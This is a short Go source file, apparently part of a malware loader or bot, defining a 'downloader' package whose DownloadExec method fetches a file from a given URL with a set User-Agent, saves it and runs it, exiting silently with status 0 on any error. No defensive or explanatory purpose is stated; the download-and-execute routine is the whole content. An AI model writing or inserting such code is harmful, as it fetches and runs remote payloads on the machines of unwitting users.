package downloader

import (
	"io/ioutil"
	"net/http"
	"os"
)

type HttpDownload struct {
	url   string
	agent string
}

func (h *HttpDownload) DownloadExec(url string) {
	client := httpClient()
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		os.Exit(0)
	}

	req.Header.Set("User-Agent", h.agent)

	resp, err := client.Do(req)
	if err != nil {
		os.Exit(0)
	}

	defer resp.Body.Close()
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		os.Exit(0)
	}

	filename := save(data)
	run(filename)
}
